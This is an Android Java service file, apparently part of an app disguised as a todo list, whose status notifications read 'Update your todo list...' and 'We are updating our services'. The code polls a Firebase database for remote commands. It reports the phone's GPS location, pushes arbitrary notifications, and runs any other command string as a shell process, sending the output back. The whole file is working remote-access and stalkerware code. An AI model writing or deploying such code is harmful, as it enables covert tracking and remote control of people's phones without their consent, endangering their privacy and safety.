package com.x.cryonics;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.content.pm.ServiceInfo;
import android.os.Looper;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class CommandService extends Service {
    private DatabaseReference commandsRef;
    private String uid, deviceId;
    private FusedLocationProviderClient locationClient;
    public static final String CHANNEL_ID = "cmd_channel";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        deviceId = intent.getStringExtra("deviceId");
        uid = FirebaseAuth.getInstance().getCurrentUser().getUid();
        locationClient = LocationServices.getFusedLocationProviderClient(this);
        createNotificationChannel();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, buildStatusNotification("Update your todo list..."),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, buildStatusNotification("Update your todo list..."));
        }

        commandsRef = FirebaseDatabase.getInstance()
                .getReference("users").child(uid).child(deviceId).child("commands");

        listenForCommands();
        return START_STICKY;
    }

    private void listenForCommands() {
        commandsRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                for (DataSnapshot cmdSnap : snapshot.getChildren()) {
                    Command cmd = cmdSnap.getValue(Command.class);
                    String key = cmdSnap.getKey();
                    if (cmd != null && "pending".equalsIgnoreCase(cmd.getStatus())) {
                        if ("get location".equalsIgnoreCase(cmd.getAction()) ||
                                "enable location".equalsIgnoreCase(cmd.getAction())) {
                            getCurrentLocationAndSend(key, cmd);
                        } else if(cmd.getAction().startsWith("notify-send ")){
                            handleNotifySend(cmd.getAction());
                        } else {
                            executeGenericCommand(key, cmd);
                        }
                        break;
                    }
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {}
        });
    }
// Add this method to your CommandService (or similar class)

    private void handleNotifySend(String commandString) {
        // Example command: notify-send "Title" "Message"
        String title = "Notification";
        String message = "";

        // Basic argument extraction using regex (handles quoted strings)
        java.util.regex.Matcher matcher = java.util.regex.Pattern
                .compile("notify-send\\s+\"([^\"]+)\"\\s+\"([^\"]+)\"")
                .matcher(commandString);
        if (matcher.find()) {
            title = matcher.group(1);
            message = matcher.group(2);
        }

        // Build notification (uses foreground channel)
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                .setAutoCancel(true);

        NotificationManager notificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.notify((int) System.currentTimeMillis(), builder.build());
    }

    private void getCurrentLocationAndSend(final String commandKey, final Command command) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                        ActivityCompat.checkSelfPermission(this, Manifest.permission.FOREGROUND_SERVICE_LOCATION) != PackageManager.PERMISSION_GRANTED)) {
            commandsRef.child(commandKey).child("status").setValue("failed");
            commandsRef.child(commandKey).child("errorMsg").setValue("Location permission not granted");
            return;
        }
        locationClient.getLastLocation().addOnSuccessListener(location -> {
            if (location != null) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();
                commandsRef.child(commandKey).child("output").setValue("Location: " + lat + "," + lon);
                commandsRef.child(commandKey).child("status").setValue("completed");
                commandsRef.child(commandKey).child("errorMsg").setValue("");
                showWakeAppNotification("We are updating our services");
            } else {
                commandsRef.child(commandKey).child("status").setValue("failed");
                commandsRef.child(commandKey).child("errorMsg").setValue("Unable to get location");
            }
        });
    }

    private void executeGenericCommand(final String commandKey, final Command command) {
        commandsRef.child(commandKey).child("status").setValue("executing");

        new Thread(() -> {
            String output = "";
            String errorMsg = "";
            try {
                // You might want to sanitize/validate command.getAction() for security
                Process process = Runtime.getRuntime().exec(command.getAction());

                // Read STDOUT
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder outBuilder = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    outBuilder.append(line).append("\n");
                    commandsRef.child(commandKey).child("output").setValue("[STDOUT] \n"+outBuilder.toString()+line);
                }

                // Read STDERR
                BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                StringBuilder errBuilder = new StringBuilder();
                while ((line = errReader.readLine()) != null) {
                    errBuilder.append(line).append("\n");
                }

                int exitCode = process.waitFor();
                output = "[STDOUT] \n" + outBuilder.toString();
                if (errBuilder.length() > 0) {
                    errorMsg = "[STDERR] \n" + errBuilder.toString();
                }
                if (exitCode != 0) {
                    errorMsg += "\nProcess exited with code " + exitCode;
                }
            } catch (Exception e) {
                errorMsg = "Error executing command: " + e.getMessage();
            }

            // Update Firebase with results (run on main thread)
            String finalOutput = output;
            String finalErrorMsg = errorMsg;
            new Handler(Looper.getMainLooper()).post(() -> {
                commandsRef.child(commandKey).child("output").setValue(finalOutput);
                commandsRef.child(commandKey).child("status").setValue("completed");
                commandsRef.child(commandKey).child("errorMsg").setValue(finalErrorMsg);
                showWakeAppNotification("No worries." + command.getAction());
            });
        }).start();
    }


    private void showWakeAppNotification(String content) {
        Intent intent = new Intent(this, DeviceCommandsActivity.class);
        intent.putExtra("from_service", true);
        intent.putExtra("deviceId", deviceId);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle("Keep everything up to date!")
                .setContentText(content)
                .setAutoCancel(false)
                .setContentIntent(pendingIntent);

        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        nm.notify(2, builder.build());
    }

    private Notification buildStatusNotification(String status) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Todo list")
                .setContentText(status)
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setAutoCancel(false)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Command Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
